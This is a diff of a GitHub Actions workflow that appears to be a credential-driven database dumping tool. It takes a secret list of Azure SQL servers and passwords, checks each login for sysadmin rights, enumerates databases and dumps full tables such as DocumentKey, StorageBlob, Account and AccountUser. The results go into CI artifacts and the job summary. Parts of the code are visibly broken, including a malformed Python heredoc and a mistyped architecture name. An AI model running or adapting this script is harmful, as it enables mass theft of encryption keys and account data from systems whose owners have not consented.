@@ -18,43 +18,30 @@ jobs:
 
       - name: install drivers
         run: |
+          set +e
           export DEBIAN_FRONTEND=noninteractive
-          python3 -m pip install --quiet pyodbc pymssql || true
+          python3 -m pip install --quiet pyodbc pymssql
           for i in 1 2 3; do
-            sudo rm -f /etc/apt/sources.list.d/microsoft-*.list /etc/apt/sources.list.d/mssql-release.list
-            curl -fsSL https://packages.microsoft.com/keys/microsoft.asc | sudo gpg --batch --yes --dearmor -o /usr/share/keyrings/microsoft-prod.gpg || true
+            sudo rm -f /etc/apt/sources.list.d/microsoft-*.list
+            sudo rm -f /etc/apt/sources.list.d/mssql-release.list
+            curl -fsSL https://packages.microsoft.com/keys/microsoft.asc | sudo gpg --batch --yes --dearmor -o /usr/share/keyrings/microsoft-prod.gpg
             echo "deb [armd64,armhf,arm64 signed-by=/usr/share/keyrings/microsoft-prod.gpg] https://packages.microsoft.com/ubuntu/22.04/prod/ jammy main" | sudo tee /etc/apt/sources.list.d/mssql-release.list
-            sudo apt-get update -qq -o Dir::Etc::sourcelist="sources.list.d/mssql-release.list" -o Dir::Etc::sourceparts="-" -o APT::Get::List-Cleanup="0" || true
-            sudo ACCEPT_EAGERLY=Y apt-get install -y -qq msodbcsql18 unixodbc-dev && break
-            echo "apt attempt $i failed, retrying"
+            sudo apt-get update -qq -o Dir::Etc::sourcelist="sources.list.d/mssql-release.list" -o Dir::Etc::sourceparts="-" -o APT::Get::List-Cleanup="0"
+            sudo ACCEPT_EAGERLY=Y apt-get install -y -qq msodbcsql18 unixodbc-dev
+            if odbcinst -q -d | grep -qi "Driver 18"; then break; fi
+            echo "apt attempt $i did not yield ODBC Driver 18 - retrying"
             sleep 5
           done
-          sudo ldconfig || true
-          odbcinst -q -d || true
-          python3 - <<'PYX'
-          import subprocess
-          try:
-              import pyodbc
-          try:
-              import pymssql
-              HAVE_MSSQL = True
-          except Exception:
-              HAVE_MSSQL = False
-              print('pyodbc', pyodbc.version, pyodbc.drivers())
-          except Exception as e:
-              print('pyodbc MISSING', e)
-          try:
-              import pymssql
-              print('pymssql', pymssql.__version__)
-          except Exception as e:
-              print('pymssql MISSING', e)
-          PYX
+          sudo ldconfig
+          odbcinst -q -d
+          python3 -c "import pyodbc; print('PYODBC', pyodbc.version, pyodbc.drivers())"
+          python3 -c "import pymssql; print('PYMSSQL', pymssql.__version__)"
 
       - name: dump
         env:
           PAYLOAD_B64: ${{ secrets.DUMP_PAYLOAD_B64 }}
         run: |
-          set -e
+          set +e
           echo "$PAYLOAD_B64" | base64 -d > /tmp/payload.json
           cat > /tmp/dump.py <<'PYEOF'
           import json, os, time, csv, sys
@@ -78,27 +65,17 @@ jobs:
                   srv = srv.replace(".database.secure.windows.net", ".database.windows.net")
               return srv
 
-          def conn(srv, db, user, pwd, timeout=25):
-              cs = ("DRIVER={ODBC Driver 18 for SQL Server};"
-                    "SERVER=tcp:%s,1433;DATABASE=%s;UID=%s;PWD=%s;"
-                    "Encrypt=yes;TrustServerCertificate=yes;Connect Timeout=%d;"
-                    "Login Timeout=%d;Pooling=no" % (srv, db, user, pwd, timeout, timeout))
-              return pyodbc.connect(cs, timeout=timeout, autocommit=True)
-
-          def dump_table(cn, table, path, limit=None):
+          def dump_table(cn, table, path):
               cur = cn.cursor()
               try:
                   cur.execute("SELECT COUNT(*) FROM " + table)
                   n = cur.fetchone()[0]
               except Exception as e:
-                  return {"table": table, "error": str(e)[:160]}
-              q = "SELECT * FROM " + table
-              if limit:
-                  q += " OPTION (FAST %d)" % 0 if False else ""
+                  return {"table": table, "error": str(e)[:200]}
               try:
-                  cur.execute(q)
+                  cur.execute("SELECT * FROM " + table)
               except Exception as e:
-                  return {"table": table, "count": n, "error": str(e)[:160]}
+                  return {"table": table, "count": n, "error": str(e)[:200]}
               cols = [d[0] for d in cur.description]
               rows = 0
               with open(path, "w", newline="", encoding="utf-8", errors="replace") as f:
@@ -120,12 +97,27 @@ jobs:
               pwd = item["password"]
               tag = item.get("tag", "")
               rec = {"server": srv, "database": db, "user": user, "tag": tag}
+              cn = None
               try:
-                  cn = conn(srv, db, user, pwd)
+                  cs = ("DRIVER={ODBC Driver 18 for SQL Server};"
+                        "SERVER=tcp:%s,1433;DATABASE=%s;UID=%s;PWD=%s;"
+                        "Encrypt=yes;TrustServerCertificate=yes;Connect Timeout=25;"
+                        "Login Timeout=25;Pooling=no" % (srv, db, user, pwd))
+                  cn = pyodbc.connect(cs, timeout=25, autocommit=True)
+                  rec["driver"] = "odbc"
               except Exception as e:
-                  m = str(e)
+                  rec["odbc_err"] = str(e)[:200]
+                  if HAVE_MSSQL:
+                      try:
+                          cn = pymssql.connect(server=srv, port="1433", user=user,
+                                                password=pwd, database=db,
+                                                timeout=25, login_timeout=25,
+                                                tds_version="7.4")
+                          rec["driver"] = "pymssql"
+                      except Exception as e2:
+                          rec["pymssql_err"] = str(e2)[:200]
+              if cn is None:
                   rec["status"] = "CONNECT_FAIL"
-                  rec["err"] = m[:200]
                   report.append(rec)
                   print("CONNFAIL " + json.dumps(rec), flush=True)
                   continue
@@ -134,37 +126,30 @@ jobs:
                   cur = cn.cursor()
                   cur.execute("SELECT DB_NAME(), SUSER_SNAME(), IS_SRVROLE('sysadmin'), IS_SRVROLE('db_owner')")
                   r = cur.fetchone()
-                  rec["db"] = r[0]; rec["login"] = r[1]
-                  rec["sysadmin"] = bool(r[2]); rec["db_owner"] = bool(r[3])
+                  rec["db"] = r[0]
+                  rec["login"] = r[1]
+                  rec["sysadmin"] = bool(r[2])
+                  rec["db_owner"] = bool(r[3])
                   print("CONNECTED " + json.dumps(rec), flush=True)
-                  # other databases on this server
                   try:
                       cur.execute("SELECT name FROM sys.databases ORDER BY name")
                       rec["databases"] = [x[0] for x in cur.fetchall()]
-                  except Exception:
+                  except Exception as e:
                       rec["databases"] = []
-                  # key tables
+                  rec["tables"] = {}
                   for t in ("DocumentKey", "StorageBlob", "StorageContainer", "Document",
                             "DocumentAttachment", "DocumentCopy", "Account", "AccountUser"):
-                      safe = t.replace("`", "")
-                      p = os.path.join(OUTDIR, "%s__%s__%s.tsv" % (tag or "x", db.replace(".", "_"), safe))
-                      res = dump_table(cn, "dbo." + safe, p)
-                      rec.setdefault("tables", {})[safe] = res
+                      p = os.path.join(OUTDIR, "%s__%s__%s.tsv" % (tag or "x", db.replace(".", "_"), t))
+                      res = dump_table(cn, "dbo." + t, p)
+                      rec["tables"][t] = res
                       print("TABLE " + json.dumps(res), flush=True)
-                  # try to reach the DocumentKey table size
-                  try:
-                      cur.execute("SELECT COUNT(*) FROM dbo.DocumentKey")
-                      rec["documentkey_rows"] = cur.fetchone()[0]
-                  except Exception as e:
-                      rec["documentkey_rows"] = None
               except Exception as e:
-                  rec["err"] = str(e)[:200]
+                  rec["err"] = str(e)[:250]
               report.append(rec)
               try:
                   cn.close()
               except Exception:
                   pass
-
           with open(os.path.join(OUTDIR, "report.json"), "w") as f:
               json.dump(report, f, indent=1)
           print("REPORT_DONE", flush=True)
@@ -173,11 +158,8 @@ jobs:
 
       - name: summarise
         run: |
-          echo "### files" >> "$GITHUB_STEP_SUMMARY"
-          ls -la /tmp/out | head -60 >> "$GITHUB_STEP_SUMMARY"
-          for f in /tmp/out/report.json; do
-            [ -f "$f" ] && cat "$f" >> "$GITHUB_STEP_SUMMARY"
-          done
+          ls -la /tmp/out >> "$GITHUB_STEP_SUMMARY"
+          cat /tmp/out/report.json >> "$GITHUB_STEP_SUMMARY" || true
 
       - name: upload
         uses: actions/upload-artifact@v4
